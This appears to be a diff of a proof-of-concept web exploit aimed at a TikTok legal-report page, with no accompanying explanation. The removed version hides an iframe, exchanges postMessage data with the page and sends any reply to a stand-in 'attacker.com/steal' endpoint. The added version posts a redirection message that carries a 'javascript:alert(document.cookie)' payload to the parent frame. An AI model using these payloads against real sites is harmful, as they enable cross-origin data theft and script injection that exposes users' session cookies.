@@ -1,27 +1,6 @@
 <script>
-window.onload = function() {
-    // 1. Create iframe to load target page
-    const iframe = document.createElement('iframe');
-    iframe.src = "https://www.tiktok.com/legal/report/Copyright";
-    iframe.style.display = "none"; // keep it hidden
-    document.body.appendChild(iframe);
-
-    // 2. Send postMessage when iframe loads
-    iframe.onload = () => {
-        console.log("Iframe loaded. Sending postMessage...");
-        iframe.contentWindow.postMessage("PING_FROM_ATTACKER", "*");
-    };
-
-    // 3. Setup listener to capture response
-    window.addEventListener("message", (e) => {
-        if (e.origin.includes("tiktok.com")) {
-            console.log('⚠️ Received response from TikTok page:', e.data);
-
-            // OPTIONAL: Exfiltrate to attacker server
-            fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
-        } else {
-            console.log("Received message from unknown origin:", e.origin);
-        }
-    });
-};
+parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: "javascript:alert(document.cookie)"
+}, "*");
 </script>
